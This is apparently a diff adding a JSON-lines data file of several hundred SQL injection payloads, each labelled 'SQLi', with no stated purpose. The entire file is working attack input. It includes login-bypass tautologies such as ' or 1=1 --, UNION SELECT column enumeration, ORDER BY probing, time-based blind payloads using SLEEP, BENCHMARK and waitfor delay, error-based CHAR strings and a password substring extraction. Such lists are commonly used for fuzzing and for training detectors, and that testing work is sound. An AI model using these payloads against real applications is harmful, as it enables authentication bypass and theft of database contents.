+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10", "type": "SQLi"}
+{"payload": "' or 1=1 --", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "type": "SQLi"}
+{"payload": "ORDER BY 13", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--", "type": "SQLi"}
+{"payload": "ORDER BY 23--", "type": "SQLi"}
+{"payload": "AnD SLEEP(5)", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "type": "SQLi"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe", "type": "SQLi"}
+{"payload": "RANDOMBLOB(1000000000/2)", "type": "SQLi"}
+{"payload": "ORDER BY 24#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "type": "SQLi"}
+{"payload": "') or '1'='1'#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "type": "SQLi"}
+{"payload": "ORDER BY 1#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 3--", "type": "SQLi"}
+{"payload": "' or 0=0 #", "type": "SQLi"}
+{"payload": "or 1=1", "type": "SQLi"}
+{"payload": "\") or \"1\"=\"1\"--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#", "type": "SQLi"}
+{"payload": "ORDER BY 4--", "type": "SQLi"}
+{"payload": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--", "type": "SQLi"}
+{"payload": "') or ('1'='1'/*", "type": "SQLi"}
+{"payload": "ORDER BY 6#", "type": "SQLi"}
+{"payload": "ORDER BY 3", "type": "SQLi"}
+{"payload": "''", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--", "type": "SQLi"}
+{"payload": "' or '1'='1", "type": "SQLi"}
+{"payload": "' or '1'='1'#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "type": "SQLi"}
+{"payload": "ORDER BY 9--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 7--", "type": "SQLi"}
+{"payload": "'or'1=1′", "type": "SQLi"}
+{"payload": "\" or 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10", "type": "SQLi"}
+{"payload": "OR x=y", "type": "SQLi"}
+{"payload": "ORDER BY 29#", "type": "SQLi"}
+{"payload": "=", "type": "SQLi"}
+{"payload": "admin' and substring(password/text(),1,1)='7", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "type": "SQLi"}
+{"payload": "waitfor delay '00:00:05'--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#", "type": "SQLi"}
+{"payload": "and (select substring(@@version,2,1))='y'", "type": "SQLi"}
+{"payload": "or pg_SLEEP(5)--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "type": "SQLi"}
+{"payload": "\") or (\"1\"=\"1", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1#", "type": "SQLi"}
+{"payload": "ORDER BY 28#", "type": "SQLi"}
+{"payload": "ORDER BY 31337", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "type": "SQLi"}
+{"payload": "ORDER BY 20#", "type": "SQLi"}
+{"payload": "ORDER BY 31337#", "type": "SQLi"}
+{"payload": "ORDER BY 10#", "type": "SQLi"}
+{"payload": "' or a=a–", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--", "type": "SQLi"}
+{"payload": "ORDER BY 27--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "type": "SQLi"}
+{"payload": "') or ('a'='a and hi\") or (\"a\"=\"a", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7--", "type": "SQLi"}
+{"payload": "' group by password having 1=1--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15", "type": "SQLi"}
+{"payload": "ORDER BY 5#", "type": "SQLi"}
+{"payload": "'\\\"", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "ORDER BY 26", "type": "SQLi"}
+{"payload": "UNION ALL SELECT NULL#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#", "type": "SQLi"}
+{"payload": "ORDER BY SLEEP(5)", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--", "type": "SQLi"}
+{"payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#", "type": "SQLi"}
+{"payload": "\") or \"1\"=\"1\"/*", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "type": "SQLi"}
+{"payload": "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "type": "SQLi"}
+{"payload": "ORDER BY 1--", "type": "SQLi"}
+{"payload": "') or ('1'='1", "type": "SQLi"}
+{"payload": "ORDER BY 2", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "type": "SQLi"}
+{"payload": "' or ''='", "type": "SQLi"}
+{"payload": "OR 1=1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'--", "type": "SQLi"}
+{"payload": "' or 1=1–", "type": "SQLi"}
+{"payload": "AND 1=0", "type": "SQLi"}
+{"payload": "ORDER BY 4#", "type": "SQLi"}
+{"payload": "\");", "type": "SQLi"}
+{"payload": "ORDER BY 17#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "type": "SQLi"}
+{"payload": "'))", "type": "SQLi"}
+{"payload": "ORDER BY 22--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT NULL", "type": "SQLi"}
+{"payload": "%\"", "type": "SQLi"}
+{"payload": "' group by userid having 1=1--", "type": "SQLi"}
+{"payload": "\") or \"1\"=\"1\"#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--", "type": "SQLi"}
+{"payload": "ORDER BY 19--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5)", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5#", "type": "SQLi"}
+{"payload": "' or 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "type": "SQLi"}
+{"payload": "1′) and '1′='1–", "type": "SQLi"}
+{"payload": "' or 1=1/*", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#", "type": "SQLi"}
+{"payload": "' or 1=1;#", "type": "SQLi"}
+{"payload": "ORDER BY 25--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))", "type": "SQLi"}
+{"payload": "') or ('x'='x", "type": "SQLi"}
+{"payload": "' #", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#", "type": "SQLi"}
+{"payload": "ORDER BY 6--", "type": "SQLi"}
+{"payload": "' and 'one'='one–", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "type": "SQLi"}
+{"payload": "ORDER BY 30#", "type": "SQLi"}
+{"payload": "\"or 1=1 or \"\"=\"", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 3#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0", "type": "SQLi"}
+{"payload": "'&&SLEEP(5)&&'1", "type": "SQLi"}
+{"payload": "SLEEP(5)='", "type": "SQLi"}
+{"payload": "and 1=1–", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--", "type": "SQLi"}
+{"payload": "'or 1=1 or ''='", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "type": "SQLi"}
+{"payload": "or SLEEP(5)", "type": "SQLi"}
+{"payload": "pg_SLEEP(5)", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9--", "type": "SQLi"}
+{"payload": "' or 'one'='one", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--", "type": "SQLi"}
+{"payload": "' and 'one'='one", "type": "SQLi"}
+{"payload": "ORDER BY 24", "type": "SQLi"}
+{"payload": "ORDER BY 24--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "type": "SQLi"}
+{"payload": "ORDER BY 30--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6--", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0#", "type": "SQLi"}
+{"payload": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6", "type": "SQLi"}
+{"payload": "ORDER BY 25#", "type": "SQLi"}
+{"payload": "\" or 0=0 --", "type": "SQLi"}
+{"payload": "'", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "type": "SQLi"}
+{"payload": "ORDER BY 28--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "' group by username having 1=1--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#", "type": "SQLi"}
+{"payload": "' or '1'='1'--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "type": "SQLi"}
